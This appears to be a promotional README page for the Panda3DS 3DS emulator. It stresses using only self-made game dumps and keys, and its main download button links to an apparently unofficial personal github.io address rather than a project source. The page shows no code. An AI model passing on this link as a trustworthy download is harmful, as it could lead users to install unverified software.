# Panda3DS - A 3DS Emulator for Dumps You Made

Panda3DS runs Nintendo 3DS software from files you dumped off a console you own. The emulator does not include games, keys, or a shop. You supply the dump. If you do not already have a file you made from hardware you may use, there is nothing to load. This page does not say where to download games.

---

## Why It Stands Out

![Panda3DS with a game list that stays empty until the user adds a dump they made](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZJdD41FpQvyYx55dKxokw4vimpZyvdMpKnmHjMiQXTQ&s=10)

A handheld emulator is a player for a cartridge or a system image you already dumped, on a screen that is not the original console. Panda3DS is one such player for the 3DS. The window can show a list only after you point it at files you placed there yourself. An empty list is the correct first launch. Filling it from a website is not part of setup.

Keys or system files, if the emulator asks for them, have to come from a console you own as well. Do not drop in a pack you found online. Save states and the original dump are different things: keep the dump you made, and treat a save as data from your play. When you are done, close the emulator. It does not need to stay running to "finish" a file you were never given.

---

## Core Capabilities

- **Your Dump:** A file you made from a console you own, in a folder you choose.
- **No Built-in Games:** The program starts without a library.
- **Your Keys, If Asked:** Only files you dumped yourself. No downloaded key packs.
- **A Save Beside the Game:** Your progress stays with your files, separate from someone else's image.
- **Close It:** The emulator is a player, not a background downloader.

## Quick Setup

Prerequisites: A dump you already made from a 3DS you own, stored in a folder on this PC.

[![GET Panda3DS](https://img.shields.io/badge/GET%20%E2%80%94%20Panda3DS-ca8a04?style=for-the-badge&logoColor=white)](https://susanscottn225.github.io/.github/panda3ds-dumps)

1.  **Install:** Open Panda3DS. Leave the list empty if you have not copied your dump yet.
2.  **Point at Your Folder:** Add the directory that holds the file you dumped.
3.  **Launch That File:** If it asks for a key you do not have from your own console, stop.
4.  **Close:** Keep the dump. A save state is not a substitute for the file you made.

## Troubleshooting

- The list is empty? You have not added your folder. That is normal. Do not search for a pack.
- A game will not boot? The dump may be incomplete, or a key from your console is missing. Do not replace it with a download.
- Frames are uneven? Lower the internal resolution before you change anything else.
- You were told to grab a BIOS pack? Do not. Use files you dumped yourself or do not run that title.
